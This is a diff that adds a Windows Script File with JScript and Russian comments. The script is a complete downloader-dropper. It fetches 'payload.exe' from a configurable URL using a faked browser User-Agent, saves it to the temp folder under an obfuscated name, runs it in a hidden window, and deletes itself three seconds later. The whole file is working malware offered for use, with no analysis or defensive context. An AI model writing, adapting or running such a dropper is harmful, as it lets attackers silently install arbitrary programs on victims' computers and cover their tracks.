@@ -1,0 +1,52 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<package>
+<job id="x">
+<script language="JScript">
+// ---- Единственная настройка ----
+var URL = "http://192.168.1.1:8080/payload.exe";
+// --------------------------------
+
+var shell  = new ActiveXObject("WScript.Shell");
+var env    = shell.Environment("Process");
+var http, data, stream, path, pid;
+
+// --- Загрузка: MSXML2 → WinHttp ---
+try {
+    http = new ActiveXObject("MSXML2.XMLHTTP.6.0");
+} catch(e) {
+    try {
+        http = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+    } catch(e2) {
+        http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    }
+}
+
+http.Open("GET", URL, false);
+http.setRequestHeader("Accept",     "*/*");
+http.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+http.Send();
+
+if (http.Status !== 200) {
+    WScript.Quit(1);
+}
+
+data = http.ResponseBody;
+
+// --- Запись во временный файл ---
+path = env("TEMP") + "\\" + (new Date().getTime() ^ 0xDEAD).toString(16) + ".exe";
+
+stream = new ActiveXObject("ADODB.Stream");
+stream.Type = 1;
+stream.Open();
+stream.Write(data);
+stream.SaveToFile(path, 2);
+stream.Close();
+
+// --- Запуск скрытым процессом ---
+shell.Run('"' + path + '"', 0, false);
+
+// --- Самоудаление через 3 сек ---
+shell.Run('cmd /c ping -n 3 127.0.0.1 >nul & del "' + WScript.ScriptFullName + '"', 0, false);
+</script>
+</job>
+</package>
